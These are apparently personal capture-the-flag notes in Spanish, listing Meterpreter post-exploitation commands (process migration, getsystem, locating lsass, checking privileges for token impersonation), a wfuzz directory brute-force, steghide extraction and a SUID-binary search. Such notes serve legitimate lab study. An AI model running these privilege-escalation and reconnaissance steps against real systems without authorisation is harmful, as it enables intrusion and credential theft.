getuid = server username
sysinfo =informacion del sistema (en metaslpoit dentro de windows informacion de meterpreter x86/x64)
ps -S explorer.exe = buscar el proceso explorer.exe
migrate PID = seleccionamos el proceso de explorer
getsystem = para elevar privilegios
net localgroup administrators = consultar usuario del grupo administradores
ps -S lsass.exe = localizar pid de proceso de autenticacion del sistema
getprivs = podemos ver los privilegios del usuario en orden de realizar una suplantacion de tokens
dir C:\\ flag /s = buscamos de forma recursiva en todo C: por el archivo flag


wfuzz -u http://IP/direcotorios/FUZZ.extension -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c --hc 404
steghide extract --sf archivo.jpg
file para ver de que tipo es un archivo


find / -perm -u=s -type f 2>/dev/null